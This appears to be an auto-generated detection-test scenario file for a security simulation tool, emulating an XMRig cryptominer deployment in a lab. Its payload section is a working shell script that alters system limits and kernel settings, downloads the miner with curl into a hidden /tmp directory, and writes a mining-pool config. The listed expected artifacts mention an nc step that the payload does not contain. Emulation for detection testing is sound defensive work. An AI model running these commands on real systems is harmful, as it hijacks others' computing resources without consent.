identity.name: Cryptominer Deployment — Unit 42 XMRig Variant
identity.summary: Auto-generated draft from CortexSim scenario SIM-CDR-002. Plane: CDR. Primary technique: T1496. Requires human enrichment of BIOC logic + panw_mapping rule_ids.
identity.description:
Auto-generated draft from CortexSim scenario SIM-CDR-002. Plane: CDR. Primary technique: T1496. Requires human enrichment of BIOC logic + panw_mapping rule_ids.

Source scenario: SIM-CDR-002.
UC: Cryptomining Activity Detection / TC: XMRig Deployment and Execution.

prerequisites.description: Lab environment matching scenario SIM-CDR-002 requirements.

payload.code:
# step-1: Disable security limits and prepare mining environment
ulimit -n 65535 2>/dev/null; \
ulimit -u unlimited 2>/dev/null; \
echo never > /sys/kernel/mm/transparent_hugepage/enabled 2>/dev/null || true; \
sysctl -w vm.nr_hugepages=128 2>/dev/null || true; \
mkdir -p /tmp/.xmr && echo '[*] Mining env prepared'
# step-2: Download XMRig binary (Unit 42 observed delivery mechanism)
ARCH=$(uname -m); \
if [ "$ARCH" = "x86_64" ]; then XMRIG_URL="https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz"; \
else XMRIG_URL="https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-armv8.tar.gz"; fi; \
curl -sSL "$XMRIG_URL" -o /tmp/.xmr/xmrig.tar.gz && \
tar -xzf /tmp/.xmr/xmrig.tar.gz -C /tmp/.xmr/ --strip-components=1 && \
chmod +x /tmp/.xmr/xmrig && \
echo '[*] XMRig downloaded successfully'
# step-3: Configure XMRig mining pool connection
cat > /tmp/.xmr/config.json << 'XMRCFG'
{
  "autosave": true,
  "cpu": {"enabled": true, "max-threads-hint": 75},
  "pools": [{
    "url": "pool.minexmr.com:4444",
    "user": "SIMULATION_WALLET_DO_NOT_USE",
    "pass": "cortexsim-test",
    "keepalive": true
  }]
}
XMRCFG
echo '[*] Mining pool config written'

expected_artifacts.description: Process execution matching curl (heuristic from scenario step step-02)
Outbound HTTP(S) request from the scenario step
Process execution matching nc (heuristic from scenario step step-05)

cleanup.code:
crontab -l 2>/dev/null | grep -v xmrig | crontab - 2>/dev/null || true
rm -rf /tmp/.xmr
echo '[CortexSim] SIM-CDR-002 cleanup complete'
